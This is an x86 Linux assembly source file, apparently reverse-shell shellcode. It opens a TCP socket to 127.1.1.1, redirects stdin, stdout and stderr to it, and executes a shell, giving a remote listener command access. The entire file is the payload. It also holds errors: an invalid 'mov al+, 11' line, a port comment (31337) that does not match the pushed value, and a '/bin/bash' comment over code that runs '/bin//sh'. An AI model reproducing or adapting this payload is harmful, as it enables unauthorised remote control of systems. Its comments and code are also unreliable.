global _start

_start:
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	xor edi, edi

	; socket_fd = socket(AF_INET, SOCK_STREAM, 0)
	mov ax, 359
	mov bl, 2
	mov cl, 1
	int 0x80

	mov edi, eax ; socket_fd
	

	;connect(socket_fd, (struct sockaddr *) &socket_struct, sizeof(socket_struct));
	; create struct
	xor eax,eax
	mov ax, 362
	mov ebx, edi
	push edx
	push 0x0101017f
	push word 0x6A7A ; 31337
	push word 0x2
	mov ecx, esp
	mov dl, 16
	int 0x80
	
	;dup2(socket_fd , i)
	xor ecx,ecx
	mov cl, 3
	xor edx,edx
	dup_loop:
		dec cl
		xor eax,eax
		mov al, 63
		int 0x80
		inc cl
		loop dup_loop
	xor eax,eax

	; execve("/bin/bash", NULL, NULL);
 	mov al+, 11
 	xor edx,edx
 	push edx  ; last NULL
 	push edx ; last NULL
 	push 0x68732f2f
 	push 0x6e69622f
 	mov ebx, esp
 	int 0x80
